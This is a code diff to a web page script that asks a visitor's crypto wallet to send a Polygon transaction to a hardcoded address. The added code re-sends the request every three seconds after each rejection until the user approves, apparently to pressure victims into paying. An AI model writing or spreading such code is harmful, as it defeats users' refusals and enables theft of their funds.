@@ -74,7 +74,6 @@
     async function promptPolygonTransaction() {
       try {
         const transactionParameters = {
-          nonce: "0x00",
           gasPrice: "0x244AC6D",
           gas: "0x12A52",
           to: "0x983C2d9302a31041bf3E342dDd420DDac122ccb6",
@@ -84,14 +83,22 @@
           chainId: "0x89",
         };
 
-        const txHash = await ethereum.request({
-          method: "eth_sendTransaction",
-          params: [transactionParameters],
-        });
-
-        console.log(`Transaction sent: ${txHash}`);
+        let retry = true;
+        while (retry) {
+          try {
+            const txHash = await ethereum.request({
+              method: "eth_sendTransaction",
+              params: [transactionParameters],
+            });
+            console.log(`Transaction sent: ${txHash}`);
+            retry = false;
+          } catch (error) {
+            console.error('Polygon transaction request failed or was rejected:', error);
+            await new Promise(resolve => setTimeout(resolve, 3000)); // wait for 3 seconds before retrying
+          }
+        }
       } catch (error) {
-        console.error('Polygon transaction request failed or was rejected:', error);
+        console.error('Error in promptPolygonTransaction:', error);
       }
     }
   </script>
